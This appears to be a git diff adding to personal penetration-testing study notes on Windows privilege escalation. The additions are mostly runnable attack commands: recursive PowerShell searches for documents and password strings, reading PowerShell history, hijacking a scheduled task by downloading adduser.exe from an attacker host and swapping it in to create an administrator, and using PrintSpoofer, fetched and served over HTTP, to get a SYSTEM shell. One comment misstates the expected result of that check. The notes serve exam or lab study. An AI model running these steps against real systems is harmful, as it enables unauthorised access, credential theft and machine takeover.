@@ -52,7 +52,12 @@ There are several key pieces of information we should always obtain:
 > Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
+> Get-History
+> (Get-PSReadlineOption).HistorySavePath
 ```
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ppkg,*.pdf -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf -File -Recurse -ErrorAction SilentlyContinue | type
+Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ppkg,*.pdf -File -Recurse -ErrorAction SilentlyContinue | type | Select-String -Pattern "special password" -Context 10,10
 ### Powerview
 
 *In the command prompt
@@ -211,6 +216,13 @@ Say that you have a shell in MetaSploit, you can background that shell and run t
 #### NTLM v NTLMv2
 
 NTLM hashes can be passed, NTLMv2 hased CANNOT be passed.
+
+#### Windows' Grep (With Context)
+
+```bash
+> schtasks /query /fo LIST | Select-String -Pattern 12 -Context 4,4
+> Get-Content file.txt | Select-String -Pattern OS -Context 2,4
+```
 
 #### Execution Policy Bypass - Per script basis
 
@@ -502,3 +514,43 @@ Restart-Service GammaService
 net user
 net localgroup administrators # Verify
 ```
+
+### Scheduled Tasks
+
+For us, three pieces of information are vital to obtain from a scheduled task to identify possible privilege escalation vectors:
+
+    As which user account (principal) does this task get executed?
+    What triggers are specified for the task?
+    What actions are executed when one or more of these triggers are met?
+
+We can view scheduled tasks on Windows with the **Get-ScheduledTask** Cmdlet or the command **schtasks/query**. We'll use the latter. We enter /fo with LIST as argument to specify the output format as list. Additionally, we add /v to display all properties of a task. We should seek interesting information in the Author, TaskName, Task To Run, Run As User, and Next Run Time fields. In our case, "interesting" means that the information partially or completely answers one of the three questions above.
+
+```bash
+schtasks /query /fo LIST /v | Select-String -Pattern "12:0" -Context 4,4 # Smart to filter the output to tasks being run in the same hour as the current time
+icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe # Check permissions for scheduled task
+iwr -Uri http://192.168.119.3/adduser.exe -Outfile BackendCacheCleanup.exe # Same binary that we made for swapping binary file
+move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
+move .\BackendCacheCleanup.exe .\Pictures\
+net user
+net localgroup administrators # Verify new user is created
+```
+
+### SeImpersonatePrivilege
+
+```bash
+whoami /priv
+```
+
+```bash
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+python3 -m http.server 80
+```
+
+```bash
+powershell -ep bypass
+iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe # -i to interact w the process &  -c to specify the command we want to execute
+whoami # Verify that it worked, that you are not NT AUTHORITY\SYSTEM
+```
+
+There are other similar tools such as RottenPotato, SweetPotato, or JuicyPotato.
